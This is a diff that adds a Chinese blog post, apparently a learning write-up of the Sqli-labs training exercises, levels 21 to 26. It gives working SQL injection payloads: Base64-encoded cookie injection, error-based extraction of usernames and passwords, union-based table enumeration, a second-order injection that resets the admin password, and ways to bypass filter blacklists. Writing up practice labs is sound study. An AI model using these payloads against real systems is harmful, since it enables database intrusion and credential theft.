@@ -1,0 +1,359 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head><meta name="generator" content="Hexo 3.8.0">
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
+
+    
+
+    
+        <meta name="description" content="前一部分链接：第11-20关Write-up
+Less-21与Less-20类似，只是对变量Cookiee进行了Base64加密，并且使用单引号和括号进行包裹
+
+将payload进行加密
+
+加入到 Cookie中，注入成功
+
+
+Less-22与前面关卡类似，只是对$cookee包括采用了双引号
+
+B">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="Huang-ShuWei(Knlvre)">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="Sqli-labs(第21-30关)">
+    
+
+    <!--Open Graph Description-->
+    
+        <meta property="og:description" content="前一部分链接：第11-20关Write-up
+Less-21与Less-20类似，只是对变量Cookiee进行了Base64加密，并且使用单引号和括号进行包裹
+
+将payload进行加密
+
+加入到 Cookie中，注入成功
+
+
+Less-22与前面关卡类似，只是对$cookee包括采用了双引号
+
+B">
+    
+
+    <!--Open Graph Site Name-->
+        <meta property="og:site_name" content="Knlvre">
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="article">
+    
+
+    <!--Page Cover-->
+    
+    
+        <meta property="og:image" content="https://knlvre.github.io/Knlvre.github-iohttp://img.sj33.cn/uploads/allimg/200912/20091206235017574.jpg">
+    
+
+        <meta name="twitter:card" content="summary_large_image">
+
+    
+
+    
+        <meta name="twitter:image" content="https://knlvre.github.io/Knlvre.github-iohttp://img.sj33.cn/uploads/allimg/200912/20091206235017574.jpg">
+    
+
+    <!-- Title -->
+    
+    <title>Sqli-labs(第21-30关) - Knlvre</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" rel="stylesheet">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/Knlvre.github-io/css/style.css">
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+    <link href="//fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel="stylesheet" type="text/css">
+    <link href="//fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+    <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+    <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet">
+
+    <!-- Google Analytics -->
+    
+
+
+    <!-- favicon -->
+    
+
+</head>
+
+
+<body>
+
+    <!-- Menu -->
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/Knlvre.github-io/">Knlvre</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+            <ul class="nav navbar-nav navbar-right">
+                
+                    <li>
+                        <a href="/Knlvre.github-io/">
+                            
+                                首页
+                            
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a href="/Knlvre.github-io/archives">
+                            
+                                归档
+                            
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a href="/Knlvre.github-io/tags">
+                            
+                                标签
+                            
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a href="https://github.com/Knlvre/Knlvre.github-io">
+                            
+                                <i class="fa fa-github fa-stack-2x"></i>
+                            
+                        </a>
+                    </li>
+                
+            </ul>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+
+    <!-- Main Content -->
+    <!-- Page Header -->
+<!-- Set your background image for this header in your post front-matter: cover -->
+
+<header class="intro-header" style="background-image: url('http://pic.netbian.com/uploads/allimg/181130/224234-154358895470e3.jpg')">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <h1>Sqli-labs(第21-30关)</h1>
+                    
+                    <h2 class="post-subheading">
+                        Sqli-labs 第21-30关的学习笔记
+                    </h2>
+                    
+                    <span class="meta">
+                        <!-- Date and Author -->
+                        
+                            Posted by Knlvre on
+                        
+                        
+                            2019-01-31
+                        
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+            <!-- Tags and categories -->
+           
+                <div class="col-lg-4 col-lg-offset-2 col-md-5 col-md-offset-1 post-tags">
+                    
+                        
+
+
+<a href="/Knlvre.github-io/tags/Sqli-labs/">#Sqli-labs</a>
+
+
+                    
+                </div>
+                <div class="col-lg-4 col-md-5 post-categories">
+                    
+                </div>
+            
+
+            <!-- Gallery -->
+            
+
+            <!-- Post Main Content -->
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <h3 id="前一部分链接：第11-20关Write-up"><a href="#前一部分链接：第11-20关Write-up" class="headerlink" title="前一部分链接：第11-20关Write-up"></a>前一部分链接：<a href="https://knlvre.github.io/Knlvre.github-io/2019/01/30/Sqli-labs%20%E7%AC%AC11-20%E5%85%B3/">第11-20关Write-up</a></h3><hr>
+<h2 id="Less-21"><a href="#Less-21" class="headerlink" title="Less-21"></a>Less-21</h2><p>与<code>Less-20</code>类似，只是对变量<code>Cookiee</code>进行了<code>Base64</code>加密，并且使用单引号和括号进行包裹</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/21-30/1-1.png" alt="1-1"></p>
+<p>将<code>payload</code>进行加密</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/21-30/1-2.png" alt="1-2"></p>
+<p>加入到 <code>Cookie</code>中，注入成功</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/21-30/1-3.png" alt="1-3"></p>
+<hr>
+<h2 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h2><p>与前面关卡类似，只是对<code>$cookee</code>包括采用了<code>双引号</code></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/21-30/2-1.png" alt="2-1"></p>
+<p><code>Base64</code>加密一下<code>payload</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot; and extractvalue(1,concat(0x7e,(select group_concat(username,password) from users where id=2),0x7e))#</span><br><span class="line"></span><br><span class="line">加密后：</span><br><span class="line">IiBhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBncm91cF9jb25jYXQodXNlcm5hbWUscGFzc3dvcmQpIGZyb20gdXNlcnMgd2hlcmUgaWQ9MiksMHg3ZSkpIw</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/21-30/2-2.png" alt="2-2"></p>
+<hr>
+<h2 id="Less-23"><a href="#Less-23" class="headerlink" title="Less-23"></a>Less-23</h2><p>查看源代码，本关将注释符：<code>#、--</code>进行了过滤，查询语句是通过<code>单引号</code>来包裹<code>$id</code>的</p>
+<p>所以只需要将结尾的单引号处理掉就好了</p>
+<p>爆表名：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; union select 1,（select group_concat(table_name) from information_schema.tables where table_schema=database()）,3 and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/21-30/3-1.png" alt="3-1"></p>
+<p>其他的语句自行构造，不再赘述</p>
+<hr>
+<h2 id="Less-24"><a href="#Less-24" class="headerlink" title="Less-24"></a>Less-24</h2><p>本关考察<code>二次排序注入（二次注入、存储型注入）</code></p>
+<p>查看本关源代码</p>
+<p><code>创建用户</code>时的语句为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into users ( username, password) values(\&quot;$username\&quot;, \&quot;$pass\&quot;)</span><br></pre></td></tr></table></figure>
+<p><code>修改密码</code>时的语句为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE users SET PASSWORD=&apos;$pass&apos; where username=&apos;$username&apos; and password=&apos;$curr_pass&apos;</span><br></pre></td></tr></table></figure>
+<p>结题思路：</p>
+<p>创建一个用户，名为<code>admin&#39;#</code>，密码随意，数据库执行以下语句：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into users ( username, password) values(\&quot;admin&apos;#\&quot;, \&quot;666\&quot;)</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/21-30/4-1.png" alt="4-1"></p>
+<p>返回首页，<code>登陆</code>这个新注册的<code>admin&#39;#</code>用户</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/21-30/4-2.png" alt="4-2"></p>
+<p>登陆成功，可以直接<code>修改密码</code>，数据库执行了以下语句：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE users SET PASSWORD=&apos;$pass&apos; where username=&apos;admin&apos;# and password=&apos;$curr_pass&apos;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/21-30/4-3.png" alt="4-3"></p>
+<p>此时<code>admin</code>用户的密码已经改成我们修改的那个密码了，可以直接登录</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/21-30/4-4.png" alt="4-4"></p>
+<hr>
+<h2 id="Less-25"><a href="#Less-25" class="headerlink" title="Less-25"></a>Less-25</h2><p><code>单引号包裹</code>、题目提示我们<code>or</code>和<code>and</code>被过滤掉了</p>
+<p>但是影响并不是很大，因为可以用<code>双写</code>绕过</p>
+<p><code>information</code>里面包含<code>or</code>，记得双写绕过就可以了：<code>infoorrmation</code></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/21-30/5-1.png" alt="5-1"></p>
+<p>其他的不再赘述</p>
+<hr>
+<h2 id="Less-25a"><a href="#Less-25a" class="headerlink" title="Less-25a"></a>Less-25a</h2><p><code>没有用符号包裹</code>、同样提示我们<code>or</code>和<code>and</code>被过滤掉了</p>
+<p>其他和Less-25一样</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/21-30/5-2.png" alt="5-2"></p>
+<hr>
+<h2 id="Less-26"><a href="#Less-26" class="headerlink" title="Less-26"></a>Less-26</h2><p>看一下源码，过滤了：<code>or、and、/、*、--、#、\s空格、/、\\</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span><span class="params">($id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	$id= preg_replace(<span class="string">'/or/i'</span>,<span class="string">""</span>, $id);			<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/and/i'</span>,<span class="string">""</span>, $id);		<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/[\/\*]/'</span>,<span class="string">""</span>, $id);		<span class="comment">//strip out /*</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/[--]/'</span>,<span class="string">""</span>, $id);		<span class="comment">//Strip out --</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/[#]/'</span>,<span class="string">""</span>, $id);			<span class="comment">//Strip out #</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/[\s]/'</span>,<span class="string">""</span>, $id);		<span class="comment">//Strip out spaces</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/[\/\\\\]/'</span>,<span class="string">""</span>, $id);		<span class="comment">//Strip out slashes</span></span><br><span class="line">	<span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>（1）<code>or</code>和<code>and</code>的绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">or：用||代替</span><br><span class="line">and:用&amp;&amp;代替</span><br></pre></td></tr></table></figure>
+<p>（2）<code>空格</code>的绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%09：tab键（水平）</span><br><span class="line">%0b：tab键（垂直）</span><br><span class="line">%0a：新建一行</span><br><span class="line">%0c：新的一页</span><br><span class="line">%0d：return功能</span><br><span class="line">%a0：空格</span><br></pre></td></tr></table></figure>
+<p>由于我的环境问题，无法解析<code>%09、%0b、%0a</code>等，只能意淫一下payload：</p>
+<p>由于<code>井号#</code>和<code>--</code>被过滤的，只能用<code>||&#39;1</code>处理掉末尾的单引号</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;%0bunion%0bselect%0b1,2,3%0b||&apos;1</span><br></pre></td></tr></table></figure>
+<hr>
+
+
+                
+            </div>
+
+            <!-- Comments -->
+            
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                    
+
+
+                </div>
+            
+        </div>
+    </div>
+</article>
+
+    <!-- Footer -->
+    <hr>
+
+<!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                    
+
+                    
+
+                    
+                        <li>
+                            <a href="https://github.com/Knlvre" target="_blank">
+                                <span class="fa-stack fa-lg">
+                                    <i class="fa fa-circle fa-stack-2x"></i>
+                                    <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                                </span>
+                            </a>
+                        </li>
+                    
+
+                    
+
+                    
+
+                    
+                </ul>
+                <p class="copyright text-muted">&copy; 2019 Huang-ShuWei(Knlvre)<br></p>
+                <p class="copyright text-muted"> Theme by <a href="http://startbootstrap.com/template-overviews/clean-blog/" target="_blank"> Clean Blog </a> from <a href="http://startbootstrap.com/" target="_blank"> Start Bootstrap </a> re-Ported by <a href="https://github.com/Knlvre" target="_blank"> Knlvre </a></p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+
+    <!-- After footer scripts -->
+    
+<!-- jQuery -->
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+
+<!-- Bootstrap -->
+<script src="//maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>
+
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
+
+<!-- Disqus Comments -->
+
+
+
+</body>
+
+</html>
